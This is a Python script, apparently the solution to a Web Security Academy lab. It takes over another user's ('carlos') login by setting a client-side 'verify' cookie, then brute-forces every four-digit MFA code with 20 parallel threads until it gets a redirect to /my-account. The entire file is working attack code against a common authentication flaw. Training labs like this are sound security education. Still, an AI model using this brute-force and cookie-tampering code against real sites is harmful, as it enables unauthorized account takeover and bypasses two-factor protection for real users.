import requests
import concurrent.futures
import os
import re

target_url = "https://0add007e040b410c80575db200290066.web-security-academy.net"

def solve():
    session = requests.Session()
    cookies = {"verify": "carlos"}
    
    response = session.get(f"{target_url}/login2", cookies=cookies)
    
    csrf_token = ""
    match = re.search(r'name="csrf" value="(.*?)"', response.text)
    if match:
        csrf_token = match.group(1)

    def attempt(code):
        data = {"mfa-code": code}
        if csrf_token:
            data["csrf"] = csrf_token
            
        r = session.post(
            f"{target_url}/login2",
            cookies=cookies,
            data=data,
            allow_redirects=False
        )
        
        if r.status_code == 302 and "/my-account" in r.headers.get("Location", ""):
            print(code)
            os._exit(0)

    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        executor.map(attempt, [f"{i:04d}" for i in range(10000)])

if __name__ == "__main__":
    solve()